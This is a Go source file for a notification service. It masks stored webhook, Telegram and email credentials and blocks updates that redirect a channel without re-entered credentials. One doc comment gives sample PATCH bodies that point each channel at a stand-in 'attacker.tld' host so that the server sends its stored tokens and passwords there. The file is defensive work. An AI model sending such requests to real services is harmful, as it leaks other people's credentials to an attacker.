package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix of a masked value. When the API echoes credentials it replaces the real content with a value carrying this prefix,
// and the update endpoint, on receiving a value with this prefix, understands it as "keep the stored value in the DB unchanged".
//
// A prefix is used rather than an empty string or a fixed constant so that a little recognizable information can be carried along
// (see MaskedValue), letting users tell "which bot this is" without having to paste the secret again.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__"              original value too short, no hint given
//	"__masked__:…ab12cd"      carries the last 6 characters of the original as a recognition hint
//
// Exposing only the last 6 characters is deliberate: the identifying part of a webhook address is its tail (e.g. WeCom's key,
// Feishu's bot id), while the prefix is the same for every bot and has no identifying value. The last 6 characters are not enough to
// recover the credential, but enough for the configurer to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unmodified since the API echoed it).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields replaced by masked values.
//
// An unknown channel type returns an empty map rather than the original config -- better to let the UI show "config unavailable"
// than to spit back the whole raw content, which may contain credentials, when the channel type is unrecognized.
// Non-credential fields are kept as is so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures such as headers are treated as a single credential as a whole: judging per sub-key would require every channel
		// to declare yet another set of rules for "which sub-keys are credentials", with complexity far exceeding the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination address changed, but the caller did not take a position on
// the credential fields". It is returned instead of silently letting it through or silently discarding the credentials; see PrepareConfigUpdate for the rationale.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys with no explicit position
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "대상 주소(" + strings.Join(e.Changed, ", ") + ")가 변경되었습니다. 자격 증명 필드(" +
		strings.Join(e.Missing, ", ") + ")를 함께 다시 입력하세요: 새 값을 넣거나, 비워 두어 더는 자격 증명이 필요 없음을 표시하세요. " +
		"기존 자격 증명은 이전 주소에만 유효하므로, 그대로 사용하면 새 주소에 넘겨주는 셈입니다."
}

// PrepareConfigUpdate merges channel configs and handles the security-sensitive case of "destination address change".
//
// It replaces a bare MergeConfig on the channel update path, and addresses a path that was demonstrated to work in practice:
// the destination address (where the message goes) and the credentials (what identity it is sent with) are two independent sets of fields, and MergeConfig
// keeps the stored value for any "unmentioned key". So anyone who can PATCH a channel, by **changing only the address and
// saying nothing about the credentials**, can make the server send the real stored credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header is sent out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → username and password handed over after STARTTLS
//
// This path is completely silent and does not depend on redirects (so rejecting cross-host redirects cannot stop it),
// and it directly defeats the goal of this package's masking mechanism -- "credentials are not echoed to the browser".
//
// Rule: whenever any destination key is changed to a new value, the caller must take an explicit position on **every** credential key:
//   - give a new value → use the new value
//   - explicitly pass an empty string → the field no longer needs a credential (keeps the clearing semantics)
//   - echo back the masked value / omit the key altogether → reject
//
// The third case is also rejected because the meaning of a "masked value" is precisely "keep using the old credential", and the old credential
// is valid only for the old address. "Automatically discarding the credentials" is deliberately not done here -- for optional credential fields
// (webhook headers, email password) that would silently turn into "authentication is gone but the API returns 200",
// which is harder to debug than an error. Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("등록되지 않은 채널 유형입니다: %q", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. a webhook's headers is an object) has the masked literal embedded in it,
	// the caller has stuffed the "keep original value" sentinel inside a structure. MergeConfig only recognizes a "string
	// with the prefix" as a mask; this shape would be stored as an ordinary object -- the literal
	// "__masked__" really lands in the DB, and later authentication silently fails with no error at all. Better to reject.
	//
	// This check must come **first**: when the address is unchanged we return early, and placing it later would mean
	// covering only the "address changed" path (the first version misplaced it exactly like that, and a test caught it).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were actually changed. A masked value counts as "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged: do the ordinary merge (masked value keeps the original, empty string clears, the rest overwrite).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require an explicit position on every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submissions that embed the mask sentinel inside a non-string structure.
//
// The mask mechanism presupposes that "the whole value is a string". For an object field such as a webhook's headers,
// it can only be masked as a whole (written as the string "__masked__") or submitted as a whole; stuffing the sentinel inside the object
// can neither express "unchanged" nor avoid being stored as a real value in the DB.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("%s 필드의 내용에 마스킹 표시(%q)가 들어 있습니다. 이 필드는 전체를 비워 두어 기존 값을 유지하거나 전체를 새 값으로 제출해야 하며, 구조체 내부에 마스킹 표시를 끼워 넣을 수 없습니다",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. JSON serialization is used for the comparison so as to also handle
// type differences -- the frontend submits a port as a number while the DB reads it back as float64, and a direct == would misjudge.
//
// "Empty" must be normalized before comparing: in this config model an empty string and a "missing key" are the same state,
// because MergeConfig treats an empty string as an explicit clear and deletes the key outright. Without normalization, an
// optional destination field that is always left blank (Telegram's base_url is the only such field: blank means use
// the official address) would walk this path --
//
//	On creation base_url:"" is stored  →  the first save has the key deleted by MergeConfig
//	→ on the second save incoming is "" and stored lacks the key, so it is judged "address changed"
//	→ the credential is a masked value → 400 "destination address changed, please re-enter the credential fields as well"
//
// From then on every save fails unless the user pastes the Bot Token again, even though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "empty".
// The criterion must match MergeConfig's clearing criterion (strings.TrimSpace(s) == ""),
// otherwise there would be a gap where "MergeConfig thinks it should be deleted but sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, used to update a channel config.
//
// Rules:
//   - a key in incoming whose value is a mask → keep stored's original value (the user did not change this field)
//   - a key in incoming whose value is an empty string → treated as an explicit clear, delete the key
//   - any other key → overwrite with incoming's value
//   - a key in stored but not in incoming → keep (partial-update semantics)
//
// Whether an empty string counts as "clear" needs to be explicit: the frontend form submits unfilled fields as empty strings,
// and writing them as valid values would really wipe out fields meant as "leave blank to keep the original value".
// Explicit clear is chosen here because when a wrongly set field must be cleared, the user has no other way to express it
// (dropping the field could distinguish "not provided" from "provided empty", but the UI has no use for that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
